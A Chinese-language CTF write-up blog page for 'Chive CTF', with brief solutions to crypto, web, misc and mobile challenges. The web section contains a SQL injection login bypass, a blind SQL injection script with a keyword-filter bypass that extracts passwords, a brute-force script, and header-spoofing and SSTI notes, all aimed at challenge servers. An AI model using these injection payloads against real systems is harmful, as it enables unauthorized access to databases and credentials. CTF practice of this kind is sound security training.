@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title> Chive CTF WP | 过客</title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title=" Chive CTF WP | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content=" Chive CTF WP"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/w03k5QaVH/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1> Chive CTF WP</h1>
+            <span class="meta">
+            	Posted on
+              2020-04-18，4 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="centercryptocenter"><center>crypto</center></h1>
+<h2 id="13道栏">13道栏</h2>
+<p>用W型栅栏解密。得到<code>http://www.atoolbox.net/Tool.php?Id=777.com</code><br>
+然后rot13一下。凯撒也可以。毕竟凯撒13次=ROT13</p>
+<h2 id="你以为这是普通的栅栏">你以为这是普通的栅栏?</h2>
+<p>和上题一样。一把梭</p>
+<h2 id="ez_py_challenge">ez_py_challenge</h2>
+<p>简单的逆向。反推一下</p>
+<pre><code>data='uCLJvGLeHuxMDMNyt{Bp'
+def decode2(ans):
+    s=''
+    for i in ans:
+        x=(ord(i)^21)-37
+        s+=chr(x)
+    return s
+def decode1(ans):
+    s=''
+    for i in ans:
+        x=(ord(i)-12)^73
+        s+=chr(x)
+    return s
+data2=decode2(data)
+print(decode1(data2))
+</code></pre>
+<h2 id="ez_rsa">ez_RSA</h2>
+<p>脚本一套</p>
+<pre><code>from Crypto.PublicKey import RSA
+import sys
+
+p = 8169558889361
+q = 1513871
+e = 17
+n = (p - 1) * (q - 1)
+i = 0
+# 17x + ny = 1
+while True:
+    if ((1 - n * i) % e == 0):
+        break;
+    i -= 1
+print '%d' % ((1 - n * i) / e)
+</code></pre>
+<h2 id="use_the_keyboard">use_the_keyboard</h2>
+<p>第一个base64解密后。看键盘。是个O形状。取包围的字符<br>
+第二个base64解密后。看键盘。也取中间的。比如PL9I。就是O</p>
+<h2 id="皇帝的flag">皇帝的flag</h2>
+<p><code>http://zero.rovelast.com/</code><br>
+复制粘贴完事</p>
+<h1 id="centerwebcenter"><center>Web</center></h1>
+<h2 id="index">index.?</h2>
+<p>curl -i http://vps.vaala.cat:28082/index.php</p>
+<h2 id="勇者斗恶龙">勇者斗恶龙</h2>
+<p>去掉html中的限制。然后一直点。到100级。不能多也不能少<br>
+<img src="https://guokeya.github.io/post-images/1587201482367.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1587201487535.png" alt="" loading="lazy"></p>
+<h2 id="勇者谎称斗恶龙">勇者谎称斗恶龙</h2>
+<p>控制台。level=99 。然后练级到100.挑战恶龙。拿flag<br>
+<img src="https://guokeya.github.io/post-images/1587201819309.png" alt="" loading="lazy"></p>
+<h2 id="catchme">catchME</h2>
+<p><code>curl -i http://vps.vaala.cat:28015/</code><br>
+header头</p>
+<h2 id="magicpassword">magicpassword</h2>
+<p><code>' or 1=1#</code></p>
+<h2 id="github">GITHUB</h2>
+<p>gitub搜vaala。再去commit找提交纪录。得到Flag</p>
+<h2 id="一百万猜数">一百万猜数</h2>
+<p>生成随机数以及比较都是在前端可控。console输入num。就能得到生成的随机数。输入即可拿到Flag</p>
+<h2 id="生日快乐">生日快乐</h2>
+<p>爆破题</p>
+<pre><code>url='http://vps.vaala.cat:28094/'
+for m in range(1,13):
+    for d in range(1,32):
+        data={&quot;card&quot;:2,
+                  &quot;year&quot;:2000,
+                  &quot;month&quot;:m,
+                  &quot;day&quot;:d}
+        r=requests.post(url=url,data=data).text
+        if '你记错啦' in r:
+            pass
+        else:
+            print(r)
+            break
+</code></pre>
+<h2 id="ezheader">ezheader</h2>
+<p><code>XFF头+UserAgent+Referer</code></p>
+<h2 id="magicmd5">magicMD5</h2>
+<p><code>弱类型+强碰撞不多说了</code></p>
+<h2 id="正则公主的秘密日记">正则公主的秘密日记</h2>
+<p>推荐一个工具<br>
+<code>http://www.atoolbox.net/Tool.php?Id=777.com</code><br>
+<img src="https://guokeya.github.io/post-images/1587202392164.png" alt="" loading="lazy"></p>
+<pre><code>1 or more times     要求带一个或者更多
+0 or more times     要求带零个或者更多
+4 times                   要求带4个
+one of                     带有其中一个字符
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1587202552625.png" alt="" loading="lazy"></figure>
+<h2 id="贷款">贷款</h2>
+<p>data字段是存储用户金额以及还款信息的<br>
+前32位为用户金额<br>
+后32位为还款信息<br>
+将后32位替换为刚登陆的时候。前32位不管。<br>
+金额变了。还款一直是0</p>
+<h2 id="robot">Robot</h2>
+<p>ssti<br>
+<img src="https://guokeya.github.io/post-images/1587202693829.png" alt="" loading="lazy"></p>
+<h2 id="getpassword">GetPassword</h2>
+<p>注入。select替换为空</p>
+<pre><code>import requests
+url=&quot;http://vps.vaala.cat:28023/index.php?username=1'||&quot;
+for a in range(40,60):
+    for b in range(30,130):
+        payload=&quot;(ascii(substr((selselectect/**/group_concat(password)/**/from/**/vaala),&quot;+str(a)+&quot;,1)))=&quot;+str(b)+&quot;--+&quot;
+        r=requests.get(url+payload).text
+        if 'you are my vaala' in r:
+            print(chr(b))
+            break
+</code></pre>
+<h1 id="centermisccenter"><center>Misc</center></h1>
+<h2 id="菩提本无树明镜亦非台">菩提本无树，明镜亦非台</h2>
+<p>佛曰解密</p>
+<h2 id="害怕黑暗吗">害怕黑暗吗</h2>
+<p>Stegsolve.jar 通道看到</p>
+<h2 id="谢尔顿的噩梦">谢尔顿的噩梦</h2>
+<p>听一下发现有敲击码</p>
+<pre><code>111 shadan 
+111 shadan
+
+111 panni
+11  shadan
+
+1111 shadan
+111 panni
+
+11 shadan
+11 shadan
+
+111 panni
+11 shadan
+
+111 shadan
+111 panni
+
+1111 shadan
+1111 shadan
+
+111 panni
+111 shadan
+
+11 shadan
+111 panni
+
+1  shadan
+1  shadan
+
+111 panni
+1111 shadan
+
+11 shadan
+111 panni
+
+1 shadan
+11111 shadan
+</code></pre>
+<p>然后转换为敲击码<br>
+paini的不用抓换。<br>
+得到</p>
+<pre><code>33 24 22 23 44 32 11 42 15
+</code></pre>
+<h2 id="give_you_flag">give_you_flag</h2>
+<p>PS反色。补齐定位点</p>
+<h2 id="搏击第五空间">搏击第五空间</h2>
+<p>exittool。base64解密下得到flag</p>
+<h2 id="简单流量分析">简单流量分析</h2>
+<p>追踪HTTP流。得到Flag</p>
+<h1 id="centermobilecenter"><center>Mobile</center></h1>
+<h2 id="送给最好的ta">送给最好的TA</h2>
+<p>notepad++。搜搜字符串</p>
+<h1 id="center签到center"><center>签到</center></h1>
+<h2 id="magiccube">magicCube</h2>
+<p>flag在某个JS里面。</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/8lQ_BdeyN/">
+              <span class="post-title">
+                ctf473831530_2018_web_virink_web(php-fpm+rsync)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span>过客</span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
